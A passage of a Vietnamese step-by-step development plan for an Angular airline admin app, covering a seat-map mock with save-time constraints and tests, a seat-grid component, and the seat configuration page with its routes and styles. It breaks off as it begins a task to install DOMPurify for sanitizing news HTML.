    return ok(this.getSeatMap(aircraftId), 'Đã lưu sơ đồ ghế');
  }
```

Thêm import `Aircraft, AircraftSeat` từ `@core/models/fleet-news.model` và `AIRCRAFT_MOCK, SEAT_TYPES_MOCK` từ `@core/mock/data/catalog.mock`.

- [ ] **Step 3: Viết test cho 3 ràng buộc**

Thêm vào `mock-registry.spec.ts`:

```ts
describe('Seat map mock — ràng buộc khi lưu', () => {
  /** Sinh sơ đồ đúng `count` ghế, hàng 1..n, cột A..F. */
  function seatsOf(count: number, seatTypeId = 1) {
    const cols = ['A', 'B', 'C', 'D', 'E', 'F'];
    const out = [];
    for (let i = 0; i < count; i++) {
      out.push({ seat_row: Math.floor(i / cols.length) + 1, seat_column: cols[i % cols.length], seat_type_id: seatTypeId });
    }
    return out;
  }

  it('từ chối sơ đồ LỆCH sức chứa', () => {
    const registry = new MockRegistry();
    // Máy bay 3 có seat_capacity = 180.
    const res = registry.resolve('PUT', 'http://x/api/v1/aircrafts/3/seat-map', {
      seats: seatsOf(179),
    }) as ApiResponse<null>;

    expect(res.code).toBe(1006);
  });

  it('từ chối sơ đồ có 2 ghế trùng hàng+cột', () => {
    const registry = new MockRegistry();
    const seats = seatsOf(180);
    seats[1] = { ...seats[0] }; // nhân bản ghế đầu -> trùng khoá
    const res = registry.resolve('PUT', 'http://x/api/v1/aircrafts/3/seat-map', { seats }) as ApiResponse<null>;

    expect(res.code).toBe(1006);
  });

  it('từ chối dùng loại ghế đang TẮT (EXIT, id 8)', () => {
    const registry = new MockRegistry();
    const res = registry.resolve('PUT', 'http://x/api/v1/aircrafts/3/seat-map', {
      seats: seatsOf(180, 8),
    }) as ApiResponse<null>;

    expect(res.code).toBe(1006);
  });

  it('CHẤP NHẬN sơ đồ khớp đúng sức chứa, loại ghế đang bật', () => {
    const registry = new MockRegistry();
    const res = registry.resolve('PUT', 'http://x/api/v1/aircrafts/3/seat-map', {
      seats: seatsOf(180, 1),
    }) as ApiResponse<SeatMap>;

    expect(res.code).toBe(1000);
    expect(res.data.configured_seats).toBe(180);
  });

  it('GET trả sức chứa và số ghế đã cấu hình', () => {
    const registry = new MockRegistry();
    const res = registry.resolve('GET', 'http://x/api/v1/aircrafts/1/seat-map') as ApiResponse<SeatMap>;

    expect(res.data.seat_capacity).toBe(305);
    expect(res.data.configured_seats).toBe(0);
  });
});
```

Thêm import `SeatMap` từ `@core/models/fleet-news.model`.

- [ ] **Step 4: Chạy test — FAIL rồi PASS**

Run: `npx ng test --watch=false`
Expected: FAIL trước khi có handler, PASS sau khi thêm.

- [ ] **Step 5: Commit**

```bash
git add src/app/core/services/catalog.service.ts src/app/core/mock/mock-registry.ts \
  src/app/core/mock/mock-registry.spec.ts
git commit -m "feat(seat-map): service và mock sơ đồ ghế với 3 ràng buộc khi lưu"
```

### Task 3.2: Màn cấu hình sơ đồ ghế

**Files:**
- Create: `src/app/features/admin/pages/seat-configurations/seat-configurations.ts`
- Create: `src/app/features/admin/pages/seat-configurations/seat-configurations.html`
- Create: `src/app/features/admin/pages/seat-configurations/seat-configurations.css`
- Create: `src/app/features/admin/pages/seat-configurations/seat-grid.ts`
- Modify: `src/app/app.routes.ts`
- Test: `src/app/features/admin/pages/seat-configurations/seat-configurations.spec.ts`

**Interfaces:**
- Consumes: `SeatMapService`, `AircraftService`, `SeatTypeService`; `Aircraft`, `SeatType`, `AircraftSeat`, `SeatMap`.
- Produces: `AdminSeatConfigurations`, `SeatGrid`; route `/admin/seat-configurations` và `/admin/seat-configurations/:id`.

- [ ] **Step 1: Viết component lưới ghế (tách riêng để dễ đọc)**

Tạo `src/app/features/admin/pages/seat-configurations/seat-grid.ts`:

```ts
import { ChangeDetectionStrategy, Component, computed, input, output } from '@angular/core';
import { MatIconModule } from '@angular/material/icon';
import { AircraftSeat, SeatType } from '@core/models/fleet-news.model';

/** Một ô trong lưới xem trước. */
export interface GridCell {
  row: number;
  column: string;
  seatTypeId: number;
}

/**
 * Lưới xem trước sơ đồ ghế — chỉ hiển thị và báo ô được bấm.
 *
 * Vì sao tách khỏi màn cấu hình: màn đó đã lo phần khai báo theo khối, đếm ghế
 * và gọi API. Lưới chỉ có một việc là vẽ và bắt sự kiện, nên tách ra thì mỗi
 * file giữ được một trách nhiệm và dễ đọc hơn.
 *
 * Vì sao lưới dựng từ `seats` chứ không vẽ theo `rows × cols` cố định: sơ đồ
 * thật không phải hình chữ nhật — hàng thương gia 2-2, hàng phổ thông 3-3, có
 * hàng khuyết. Nên phải vẽ theo đúng danh sách ghế đang có.
 */
@Component({
  selector: 'app-seat-grid',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [MatIconModule],
  templateUrl: './seat-grid.html',
  styleUrl: './seat-grid.css',
})
export class SeatGrid {
  readonly seats = input.required<AircraftSeat[]>();
  readonly seatTypes = input.required<SeatType[]>();

  /** Bấm một ô để mở bảng đổi loại ghế cho riêng ô đó. */
  readonly cellClicked = output<GridCell>();

  /** Các hàng có ghế, sắp tăng dần — dùng làm nhãn trục dọc. */
  protected readonly rows = computed(() => {
    const set = new Set(this.seats().map((s) => s.seat_row));
    return [...set].sort((a, b) => a - b);
  });

  /** Các cột có ghế, sắp theo alphabet — dùng làm nhãn trục ngang. */
  protected readonly columns = computed(() => {
    const set = new Set(this.seats().map((s) => s.seat_column));
    return [...set].sort();
  });

  /** Ghế tại (hàng, cột); `null` nếu hàng đó khuyết ô này. */
  protected seatAt(row: number, column: string): AircraftSeat | null {
    return this.seats().find((s) => s.seat_row === row && s.seat_column === column) ?? null;
  }

  /** Mã loại ghế để hiện trong ô, ví dụ "ECO" — tra từ `seat_type_id`. */
  protected typeCode(seatTypeId: number): string {
    return this.seatTypes().find((t) => t.id === seatTypeId)?.seat_type_code ?? '?';
  }

  /** Lớp CSS theo hạng ghế — màu ô phản ánh ECONOMY/BUSINESS/FIRST. */
  protected classOf(seat: AircraftSeat): string {
    const cls = this.seatTypes().find((t) => t.id === seat.seat_type_id)?.seat_class ?? 'ECONOMY';
    return `cell cell--${cls.toLowerCase()}`;
  }

  protected onCell(seat: AircraftSeat): void {
    this.cellClicked.emit({
      row: seat.seat_row,
      column: seat.seat_column,
      seatTypeId: seat.seat_type_id,
    });
  }
}
```

- [ ] **Step 2: Viết template lưới**

Tạo `seat-grid.html`:

```html
<!-- Bảng cuộn ngang: máy bay 6 cột vẫn vừa, nhưng để chắc chắn không đẩy cả
     trang tràn ngang trên màn hẹp. -->
<div class="grid-wrap">
  <table class="grid">
    <caption class="sr-only">Lưới ghế xem trước</caption>
    <thead>
      <tr>
        <th class="grid__corner" scope="col"></th>
        @for (col of columns(); track col) {
          <th class="grid__colhead" scope="col">{{ col }}</th>
        }
      </tr>
    </thead>
    <tbody>
      @for (row of rows(); track row) {
        <tr>
          <th class="grid__rowhead" scope="row">{{ row }}</th>
          @for (col of columns(); track col) {
            @if (seatAt(row, col); as seat) {
              <td>
                <button
                  type="button"
                  [class]="classOf(seat)"
                  [attr.aria-label]="'Ghế ' + row + col + ', loại ' + typeCode(seat.seat_type_id)"
                  (click)="onCell(seat)"
                >
                  {{ typeCode(seat.seat_type_id) }}
                </button>
              </td>
            } @else {
              <!-- Hàng khuyết ô (lối đi, khoang trống) — để trống có chủ đích. -->
              <td class="grid__gap" aria-hidden="true"></td>
            }
          }
        </tr>
      }
    </tbody>
  </table>
</div>
```

- [ ] **Step 3: Viết CSS lưới**

Tạo `seat-grid.css`:

```css
.grid-wrap {
  overflow-x: auto;
}

.grid {
  border-collapse: separate;
  border-spacing: 4px;
  margin: 0 auto;
}

.grid__corner,
.grid__colhead,
.grid__rowhead {
  font-size: 11.5px;
  font-weight: 700;
  color: var(--color-ink-subtle);
  text-align: center;
}

.grid__colhead {
  width: 38px;
}

.grid__rowhead {
  width: 26px;
}

.cell {
  width: 38px;
  height: 38px;
  border-radius: var(--radius-sm);
  border: 1px solid transparent;
  font-family: var(--font-body);
  font-size: 10px;
  font-weight: 700;
  cursor: pointer;
  color: #fff;
  transition: transform var(--dur-fast) var(--ease);
}

.cell:hover {
  transform: scale(1.08);
}

/* Màu theo hạng ghế — khớp bảng Seat UI của tài liệu UI. */
.cell--economy {
  background: var(--color-primary-bright);
}

.cell--business {
  background: var(--color-accent);
  color: var(--color-on-accent);
}

.cell--first {
  background: var(--color-danger);
}

.grid__gap {
  width: 38px;
  height: 38px;
}

.sr-only {
  position: absolute;
  width: 1px;
  height: 1px;
  overflow: hidden;
  clip: rect(0, 0, 0, 0);
  white-space: nowrap;
}
```

- [ ] **Step 4: Viết màn cấu hình — TS**

Tạo `seat-configurations.ts`:

```ts
import { ChangeDetectionStrategy, Component, computed, inject, signal } from '@angular/core';
import { FormsModule } from '@angular/forms';
import { ActivatedRoute, Router, RouterLink } from '@angular/router';
import { MatIconModule } from '@angular/material/icon';
import { MatSnackBar } from '@angular/material/snack-bar';
import { Aircraft, AircraftSeat, SeatType } from '@core/models/fleet-news.model';
import { AircraftService, SeatMapService, SeatTypeService } from '@core/services/catalog.service';
import { AppAlert } from '@shared/ui/app-alert/app-alert';
import { AppButton } from '@shared/ui/app-button/app-button';
import { AppCard } from '@shared/ui/app-card/app-card';
import { LoadingState } from '@shared/ui/loading-state/loading-state';
import { GridCell, SeatGrid } from './seat-grid';

/** Một dòng khai báo khối ghế trên form. */
interface BlockRow {
  /** Khoá tạm cho @for — dòng mới chưa có id từ DB. */
  key: number;
  fromRow: number;
  toRow: number;
  /** Cột dạng chuỗi "A,B,C" — ADMIN gõ tay, cho phép khai 2-3-2 tuỳ ý. */
  columns: string;
  seatTypeId: number | null;
}

/**
 * Cấu hình sơ đồ ghế — SEAT-01/02 (API v0.2 mục 2.6).
 *
 * Vì sao khai theo KHỐI rồi sinh lưới, không bắt ADMIN bấm từng ô: máy bay 300
 * ghế mà bấm tay từng ô thì không ai làm nổi. Khối là cách tự nhiên để mô tả
 * "hàng 1–4 cột A,B,C,D loại Thương gia" — đúng cách hãng bay thật khai cabin.
 *
 * Vì sao KHÔNG dùng `CrudPage`: đây không phải danh sách bản ghi mà là MỘT sơ
 * đồ thuộc về một máy bay, lưu bằng cách gửi cả sơ đồ. Không có endpoint
 * CRUD từng ghế.
 */
@Component({
  selector: 'app-admin-seat-configurations',
  changeDetection: ChangeDetectionStrategy.OnPush,
  imports: [
    FormsModule, RouterLink, MatIconModule, AppAlert, AppButton, AppCard, LoadingState, SeatGrid,
  ],
  templateUrl: './seat-configurations.html',
  styleUrl: './seat-configurations.css',
})
export class AdminSeatConfigurations {
  private readonly aircraftService = inject(AircraftService);
  private readonly seatTypeService = inject(SeatTypeService);
  private readonly seatMapService = inject(SeatMapService);
  private readonly route = inject(ActivatedRoute);
  private readonly router = inject(Router);
  private readonly snackBar = inject(MatSnackBar);

  protected readonly loading = signal(true);
  protected readonly saving = signal(false);
  protected readonly aircraft = signal<Aircraft | null>(null);
  protected readonly seatTypes = signal<SeatType[]>([]);
  protected readonly seats = signal<AircraftSeat[]>([]);
  protected readonly blocks = signal<BlockRow[]>([]);
  protected readonly errorMessage = signal('');

  /** Ô đang được sửa lẻ — `null` nghĩa là không mở bảng chọn. */
  protected readonly editingCell = signal<GridCell | null>(null);

  private blockKeySeq = 1;

  /** Loại ghế chọn được: chỉ loại đang bật (DB v0.4: tắt thì không chọn được). */
  protected readonly usableSeatTypes = computed(() =>
    this.seatTypes().filter((t) => t.is_active && !t.is_deleted),
  );

  protected readonly capacity = computed(() => this.aircraft()?.seat_capacity ?? 0);

  protected readonly configuredCount = computed(() => this.seats().length);

  /** Lệch bao nhiêu ghế so với sức chứa — 0 là hợp lệ. */
  protected readonly diff = computed(() => this.configuredCount() - this.capacity());

  protected readonly canSave = computed(
    () => this.configuredCount() > 0 && this.diff() === 0 && !this.saving(),
  );

  constructor() {
    const id = this.route.snapshot.paramMap.get('id');
    if (!id) {
      // Không có id máy bay thì màn này vô nghĩa — đưa về danh sách máy bay.
      this.router.navigate(['/admin/aircrafts']);
      return;
    }
    this.loadAircraft(Number(id));
    this.seatTypeService.list({ page: 1, size: 100 }).subscribe({
      next: (res) => this.seatTypes.set(res.data.items),
      error: (err: Error) => this.notify(err.message),
    });
  }

  private loadAircraft(id: number): void {
    this.loading.set(true);
    this.aircraftService.getById(id).subscribe({
      next: (res) => {
        this.aircraft.set(res.data);
        this.loadSeatMap(id);
      },
      error: (err: Error) => {
        this.notify(err.message);
        this.loading.set(false);
        this.router.navigate(['/admin/aircrafts']);
      },
    });
  }

  private loadSeatMap(aircraftId: number): void {
    this.seatMapService.getMap(aircraftId).subscribe({
      next: (res) => {
        this.seats.set(res.data.seats);
        this.loading.set(false);
      },
      error: (err: Error) => {
        this.notify(err.message);
        this.loading.set(false);
      },
    });
  }

  // ---------- Khai báo theo khối ----------

  protected addBlock(): void {
    this.blocks.set([
      ...this.blocks(),
      {
        key: this.blockKeySeq++,
        fromRow: 1,
        toRow: 1,
        columns: 'A,B,C,D,E,F',
        seatTypeId: this.usableSeatTypes()[0]?.id ?? null,
      },
    ]);
  }

  protected removeBlock(key: number): void {
    this.blocks.set(this.blocks().filter((b) => b.key !== key));
  }

  protected setBlock<K extends keyof Omit<BlockRow, 'key'>>(key: number, field: K, value: BlockRow[K]): void {
    this.blocks.set(this.blocks().map((b) => (b.key === key ? { ...b, [field]: value } : b)));
  }

  /**
   * Sinh lưới từ các khối đã khai.
   *
   * Ghi đè theo thứ tự khai: khối sau phủ khối trước ở cùng (hàng, cột) — nhờ
   * vậy ADMIN có thể khai "cả cabin phổ thông" rồi thêm một khối nhỏ đè lên
   * vài hàng để đổi thành thương gia, thay vì phải khai từng dải rời rạc.
   */
  protected generate(): void {
    const map = new Map<string, AircraftSeat>();

    for (const b of this.blocks()) {
      if (b.seatTypeId === null) {
        this.errorMessage.set('Mỗi khối phải chọn loại ghế');
        return;
      }
      const cols = b.columns
        .split(',')
        .map((c) => c.trim().toUpperCase())
        .filter((c) => c.length > 0);
      if (cols.length === 0) {
        this.errorMessage.set('Mỗi khối phải có ít nhất một cột');
        return;
      }
      if (b.toRow < b.fromRow) {
        this.errorMessage.set('Hàng kết thúc phải lớn hơn hoặc bằng hàng bắt đầu');
        return;
      }

      for (let r = b.fromRow; r <= b.toRow; r++) {
        for (const c of cols) {
          map.set(`${r}-${c}`, { seat_row: r, seat_column: c, seat_type_id: b.seatTypeId });
        }
      }
    }

    this.errorMessage.set('');
    this.seats.set([...map.values()].sort((a, b) => a.seat_row - b.seat_row || a.seat_column.localeCompare(b.seat_column)));
  }

  // ---------- Sửa lẻ từng ô ----------

  protected onCellClicked(cell: GridCell): void {
    this.editingCell.set(cell);
  }

  /** Đổi loại ghế cho đúng một ô — dùng khi khối sinh ra chưa đúng ý. */
  protected applyCellType(seatTypeId: number): void {
    const cell = this.editingCell();
    if (!cell) return;

    this.seats.set(
      this.seats().map((s) =>
        s.seat_row === cell.row && s.seat_column === cell.column ? { ...s, seat_type_id: seatTypeId } : s,
      ),
    );
    this.editingCell.set(null);
  }

  protected cancelCellEdit(): void {
    this.editingCell.set(null);
  }

  protected clearAll(): void {
    this.seats.set([]);
    this.blocks.set([]);
    this.errorMessage.set('');
  }

  // ---------- Lưu ----------

  protected save(): void {
    const aircraft = this.aircraft();
    if (!aircraft) return;

    // Chặn trước ở FE để ADMIN thấy ngay lệch bao nhiêu, thay vì bấm Lưu rồi
    // nhận thông báo lỗi từ server.
    if (this.diff() !== 0) {
      this.errorMessage.set(
        `Sơ đồ đang có ${this.configuredCount()} ghế, cần đúng ${this.capacity()} ghế (lệch ${Math.abs(this.diff())}).`,
      );
      return;
    }

    this.saving.set(true);
    this.errorMessage.set('');
    this.seatMapService.saveMap(aircraft.id, this.seats()).subscribe({
      next: (res) => {
        this.saving.set(false);
        this.seats.set(res.data.seats);
        this.notify(res.message);
      },
      error: (err: Error) => {
        this.saving.set(false);
        this.errorMessage.set(err.message);
      },
    });
  }

  protected back(): void {
    this.router.navigate(['/admin/aircrafts']);
  }

  private notify(message: string): void {
    this.snackBar.open(message, 'Đóng', { duration: 3000 });
  }
}
```

- [ ] **Step 5: Viết màn cấu hình — HTML**

Tạo `seat-configurations.html`:

```html
<div class="wrap">
  <nav class="crumbs" aria-label="Đường dẫn">
    <a routerLink="/admin/aircrafts">Máy bay</a>
    <mat-icon>chevron_right</mat-icon>
    <span>Sơ đồ ghế</span>
  </nav>

  @if (loading()) {
    <app-app-card><app-loading-state /></app-app-card>
  } @else if (aircraft(); as ac) {
    <header class="page-h">
      <div>
        <h1>Sơ đồ ghế — {{ ac.aircraft_code }}</h1>
        <p>{{ ac.model }} · sức chứa {{ ac.seat_capacity }} ghế</p>
      </div>
      <app-app-button variant="ghost" (clicked)="back()">
        <mat-icon>arrow_back</mat-icon>
        Về danh sách máy bay
      </app-app-button>
    </header>

    @if (errorMessage(); as msg) {
      <div class="blk">
        <app-alert tone="error" title="Chưa lưu được" [message]="msg" />
      </div>
    }

    <!-- ===== Bước 1: khai theo khối ===== -->
    <app-app-card title="1. Khai báo theo khối" class="blk">
      <app-app-button cardActions size="sm" variant="ghost" (clicked)="addBlock()">
        <mat-icon>add</mat-icon>
        Thêm khối
      </app-app-button>

      <p class="note">
        Mỗi khối là một dải ghế: <strong>hàng từ–đến</strong> × <strong>danh sách cột</strong> ×
        <strong>loại ghế</strong>. Cột gõ cách nhau bằng dấu phẩy, ví dụ <code>A,B,C,D,E,F</code>.
        Khối khai sau sẽ <strong>đè</strong> khối trước ở cùng hàng và cột.
      </p>

      @if (blocks().length === 0) {
        <p class="empty-line">Chưa có khối nào — bấm "Thêm khối" để bắt đầu.</p>
      } @else {
        <div class="block-list">
          @for (b of blocks(); track b.key) {
            <div class="block-row">
              <label class="block-row__f">
                <span>Từ hàng</span>
                <input
                  type="number"
                  min="1"
                  [ngModel]="b.fromRow"
                  (ngModelChange)="setBlock(b.key, 'fromRow', +$event)"
                />
              </label>
              <label class="block-row__f">
                <span>Đến hàng</span>
                <input
                  type="number"
                  min="1"
                  [ngModel]="b.toRow"
                  (ngModelChange)="setBlock(b.key, 'toRow', +$event)"
                />
              </label>
              <label class="block-row__f block-row__f--wide">
                <span>Cột</span>
                <input
                  type="text"
                  [ngModel]="b.columns"
                  (ngModelChange)="setBlock(b.key, 'columns', $event)"
                  placeholder="A,B,C,D,E,F"
                />
              </label>
              <label class="block-row__f block-row__f--wide">
                <span>Loại ghế</span>
                <select
                  [ngModel]="b.seatTypeId"
                  (ngModelChange)="setBlock(b.key, 'seatTypeId', +$event)"
                >
                  @for (t of usableSeatTypes(); track t.id) {
                    <option [value]="t.id">{{ t.seat_type_name }}</option>
                  }
                </select>
              </label>
              <button
                class="block-row__del"
                type="button"
                aria-label="Xoá khối"
                (click)="removeBlock(b.key)"
              >
                <mat-icon>delete_outline</mat-icon>
              </button>
            </div>
          }
        </div>

        <div class="block-actions">
          <app-app-button (clicked)="generate()">
            <mat-icon>grid_on</mat-icon>
            Sinh lưới xem trước
          </app-app-button>
          <app-app-button variant="ghost" (clicked)="clearAll()">Xoá hết</app-app-button>
        </div>
      }
    </app-app-card>

    <!-- ===== Bước 2: xem trước + sửa lẻ ===== -->
    <app-app-card title="2. Xem trước và chỉnh lẻ" class="blk">
      <p class="note">
        Bấm vào một ô để đổi loại ghế cho riêng ô đó.
      </p>

      @if (seats().length === 0) {
        <p class="empty-line">Chưa có ghế nào — khai khối ở bước 1 rồi bấm "Sinh lưới xem trước".</p>
      } @else {
        <app-seat-grid [seats]="seats()" [seatTypes]="seatTypes()" (cellClicked)="onCellClicked($event)" />
      }

      @if (editingCell(); as cell) {
        <div class="cell-editor">
          <span class="cell-editor__title">Ghế {{ cell.row }}{{ cell.column }} — chọn loại ghế:</span>
          <div class="cell-editor__opts">
            @for (t of usableSeatTypes(); track t.id) {
              <app-app-button size="sm" variant="ghost" (clicked)="applyCellType(t.id)">
                {{ t.seat_type_name }}
              </app-app-button>
            }
            <app-app-button size="sm" variant="ghost" (clicked)="cancelCellEdit()">Huỷ</app-app-button>
          </div>
        </div>
      }
    </app-app-card>

    <!-- ===== Bước 3: lưu ===== -->
    <app-app-card title="3. Kiểm tra và lưu" class="blk">
      <div class="counter" [class.counter--bad]="diff() !== 0">
        <div class="counter__n">{{ configuredCount() }} / {{ capacity() }}</div>
        <div class="counter__l">ghế đã cấu hình trên sức chứa máy bay</div>
        @if (diff() !== 0) {
          <div class="counter__d">
            Lệch {{ diff() > 0 ? '+' : '' }}{{ diff() }} ghế — phải khớp đúng mới lưu được
          </div>
        }
      </div>

      <div class="form-actions">
        <app-app-button variant="ghost" (clicked)="back()">Huỷ</app-app-button>
        <app-app-button [disabled]="!canSave()" (clicked)="save()">
          {{ saving() ? 'Đang lưu…' : 'Lưu sơ đồ ghế' }}
        </app-app-button>
      </div>
    </app-app-card>
  }
</div>
```

- [ ] **Step 6: Viết màn cấu hình — CSS**

Tạo `seat-configurations.css`. Dùng lại khuôn `.crumbs`, `.page-h`, `.blk`, `.note`, `.empty-line`, `.form-actions` từ `promotion-form.css` (sao chép các rule đó) rồi thêm:

```css
/* ---------- Danh sách khối ---------- */
.block-list {
  display: flex;
  flex-direction: column;
  gap: 10px;
  margin-bottom: 14px;
}

.block-row {
  display: grid;
  grid-template-columns: 100px 100px 1fr 1fr 40px;
  gap: 10px;
  align-items: end;
}

.block-row__f {
  display: flex;
  flex-direction: column;
  gap: 4px;
  min-width: 0;
}

.block-row__f span {
  font-size: 11.5px;
  font-weight: 600;
  color: var(--color-ink-muted);
}

.block-row__f input,
.block-row__f select {
  font-family: var(--font-body);
  font-size: 14px;
  padding: 9px 11px;
  border: 1.5px solid var(--color-border);
  border-radius: var(--radius);
  background: var(--color-surface);
  color: var(--color-ink);
  outline: none;
  width: 100%;
}

.block-row__f input:focus,
.block-row__f select:focus {
  border-color: var(--color-primary-bright);
  box-shadow: 0 0 0 3px rgba(1, 148, 243, 0.14);
}

.block-row__del {
  border: 1.5px solid var(--color-border);
  background: var(--color-surface);
  border-radius: var(--radius);
  width: 40px;
  height: 40px;
  display: inline-flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  color: var(--color-ink-muted);
}

.block-row__del:hover {
  border-color: var(--color-danger);
  color: var(--color-danger);
  background: var(--color-danger-soft);
}

.block-actions {
  display: flex;
  gap: 9px;
  flex-wrap: wrap;
}

/* ---------- Bảng đổi loại ghế cho một ô ---------- */
.cell-editor {
  margin-top: 14px;
  padding: 12px 14px;
  border: 1.5px dashed var(--color-border);
  border-radius: var(--radius);
  background: var(--color-surface-alt);
}

.cell-editor__title {
  display: block;
  font-size: 12.5px;
  font-weight: 600;
  margin-bottom: 9px;
}

.cell-editor__opts {
  display: flex;
  gap: 7px;
  flex-wrap: wrap;
}

/* ---------- Bộ đếm ghế ---------- */
.counter {
  padding: 14px 16px;
  border-radius: var(--radius);
  background: var(--color-success-soft);
  color: var(--color-on-success-soft);
  margin-bottom: 14px;
}

.counter--bad {
  background: var(--color-danger-soft);
  color: var(--color-on-danger-soft);
}

.counter__n {
  font-family: var(--font-heading);
  font-size: 25px;
  font-weight: 700;
  font-variant-numeric: tabular-nums;
}

.counter__l {
  font-size: 12.5px;
}

.counter__d {
  margin-top: 6px;
  font-size: 12.5px;
  font-weight: 600;
}

@media (max-width: 760px) {
  /* Mỗi khối xếp dọc để ô nhập không bị bóp quá hẹp. */
  .block-row {
    grid-template-columns: 1fr 1fr;
  }

  .block-row__f--wide {
    grid-column: 1 / -1;
  }
}
```

- [ ] **Step 7: Viết test**

Tạo `seat-configurations.spec.ts`:

```ts
import { provideHttpClient, withInterceptors } from '@angular/common/http';
import { TestBed } from '@angular/core/testing';
import { ActivatedRoute, convertToParamMap, provideRouter } from '@angular/router';
import { MockRegistry } from '@core/mock/mock-registry';
import { mockInterceptor } from '@core/mock/mock.interceptor';
import { AdminSeatConfigurations } from '@features/admin/pages/seat-configurations/seat-configurations';

/** Máy bay id 3 có seat_capacity = 180 trong mock. */
function setup(aircraftId: string) {
  return TestBed.configureTestingModule({
    imports: [AdminSeatConfigurations],
    providers: [
      provideRouter([]),
      MockRegistry,
      provideHttpClient(withInterceptors([mockInterceptor])),
      {
        provide: ActivatedRoute,
        useValue: { snapshot: { paramMap: convertToParamMap({ id: aircraftId }) } },
      },
    ],
  }).compileComponents();
}

describe('AdminSeatConfigurations (tích hợp mock)', () => {
  it('nạp đúng sức chứa của máy bay', async () => {
    await setup('3');
    const fixture = TestBed.createComponent(AdminSeatConfigurations);
    fixture.detectChanges();
    await new Promise((r) => setTimeout(r, 700));
    fixture.detectChanges();

    const text = (fixture.nativeElement as HTMLElement).textContent ?? '';
    expect(text).toContain('180');
  });

  it('chưa khai khối nào thì chưa lưu được', async () => {
    await setup('3');
    const fixture = TestBed.createComponent(AdminSeatConfigurations);
    fixture.detectChanges();
    await new Promise((r) => setTimeout(r, 700));
    fixture.detectChanges();

    const el = fixture.nativeElement as HTMLElement;
    const saveBtn = Array.from(el.querySelectorAll('button')).find((b) =>
      (b.textContent ?? '').includes('Lưu sơ đồ ghế'),
    );
    expect(saveBtn?.disabled).toBe(true);
  });
});
```

- [ ] **Step 8: Chạy test — PASS**

Run: `npx ng test --watch=false`
Expected: PASS.

- [ ] **Step 9: Thêm route**

Trong `src/app/app.routes.ts`, **xóa** `...comingSoonAdmin('seat-configurations', 'Sơ đồ ghế', true),` và thêm:

```ts
      {
        path: 'seat-configurations/:id',
        canActivate: [adminGuard],
        loadComponent: () =>
          import('@features/admin/pages/seat-configurations/seat-configurations').then(
            (m) => m.AdminSeatConfigurations,
          ),
        data: { title: 'Sơ đồ ghế' },
      },
```

**Quan trọng:** đường dẫn cấu hình sơ đồ nằm ở `/admin/seat-configurations/:id` (theo máy bay), không phải một màn danh sách. Trong `admin-layout.ts`, đổi mục sidebar "Sơ đồ ghế" từ `/admin/seat-configurations` sang `/admin/aircrafts` — vì vào sơ đồ phải chọn máy bay trước. Sửa trong `navGroups`:

```ts
        {
          path: '/admin/aircrafts',
          label: 'Sơ đồ ghế',
          icon: 'event_seat',
          adminOnly: true,
        },
```

(Đây là mục **thứ hai** trỏ tới `/admin/aircrafts`; giữ cả hai vì nhãn khác nhau giúp người vận hành vào đúng việc.)

**Cách vào sơ đồ ghế:** làm ngay trong cụm này — thêm hỗ trợ cột dạng liên kết vào `CrudColumn`, vì không có nó thì màn sơ đồ ghế không truy cập được từ giao diện, và một màn không vào được thì không kiểm chứng được.

Sửa `src/app/shared/crud/crud-config.ts`, thêm vào `CrudColumn<T>`:

```ts
  /**
   * Có `link` thì ô render thành thẻ <a> tới đường dẫn này, thay vì chữ thường.
   * Dùng cho cột dẫn sang màn con của bản ghi (ví dụ "Cấu hình sơ đồ ghế" ở
   * danh sách máy bay).
   */
  link?: (row: T) => string;
```

Sửa `src/app/shared/crud/crud-page.html`, trong nhánh render ô bảng (khoảng dòng 105–115, ngay sau `@else if (c.tone)`), thêm nhánh cho `link`:

```html
                      } @else if (c.link) {
                        <a
                          class="rowlink"
                          [routerLink]="c.link(row)"
                          (click)="$event.stopPropagation()"
                        >
                          {{ c.value(row) }}
                        </a>
                      } @else {
```

Thêm CSS vào `src/app/shared/crud/crud-page.css`:

```css
/* Cột dẫn sang màn con của bản ghi. */
.rowlink {
  font-size: 12.5px;
  font-weight: 600;
  color: var(--color-primary-bright);
  text-decoration: none;
  white-space: nowrap;
}

.rowlink:hover {
  text-decoration: underline;
}
```

Rồi khai cột ở `src/app/features/admin/pages/aircrafts/aircrafts.ts` — thêm vào cuối mảng `columns`:

```ts
      {
        label: 'Sơ đồ ghế',
        value: () => 'Cấu hình',
        link: (r) => `/admin/seat-configurations/${r.id}`,
        width: '120px',
      },
```



- [ ] **Step 10: Build + kiểm chứng trên trình duyệt**

Run: `npx ng build`
Expected: build xanh.

Trên trình duyệt (`admin@demo.local`):
- Vào `/admin/aircrafts`, bấm cột **Cấu hình** ở dòng máy bay `VJ-A320-12` (180 ghế) → mở `/admin/seat-configurations/3`.
- Khai khối: hàng 1–1, cột `A,B,C,D,E,F`, loại "Phổ thông" → **Sinh lưới** → bộ đếm hiện `6 / 180`, màu đỏ.
- Khai thêm khối hàng 2–30 cùng cột → **Sinh lưới** → `180 / 180`, màu xanh, nút Lưu bật.
- Bấm một ô → hiện bảng chọn loại ghế → đổi sang "Ghế thương gia" → ô đổi màu.
- Bấm **Lưu sơ đồ ghế** → thông báo thành công.
- Thử khai thiếu 1 hàng → bộ đếm đỏ, nút Lưu tắt, và nếu bấm Lưu thì hiện cảnh báo lệch.
- 375px: lưới cuộn ngang trong khung, cả trang không tràn ngang.

- [ ] **Step 11: Commit**

```bash
git add src/app/features/admin/pages/seat-configurations/ src/app/app.routes.ts \
  src/app/features/admin/layout/admin-layout.ts src/app/shared/crud/crud-config.ts \
  src/app/shared/crud/crud-page.html src/app/features/admin/pages/aircrafts/aircrafts.ts
git commit -m "feat(seat-map): màn cấu hình sơ đồ ghế theo khối với lưới xem trước"
```

---

# CỤM 4 — Trang khách: Khuyến mãi & Tin tức

Hai màn danh sách + chi tiết cho khách. Tin tức **bắt buộc sanitize HTML** trước khi render.

### Task 4.1: Cài DOMPurify + service sanitize

**Files:**
- Modify: `package.json` (qua `npm install`)
- Create: `src/app/core/services/sanitize.service.ts`
- Test: `src/app/core/services/sanitize.service.spec.ts`

**Interfaces:**
- Consumes: không.
- Produces: `SanitizeService.sanitizeHtml(html: string): string`.

- [ ] **Step 1: Cài DOMPurify**

Run:
```bash
npm install dompurify@^3.2.7
npm install --save-dev @types/dompurify@^3.0.5
```

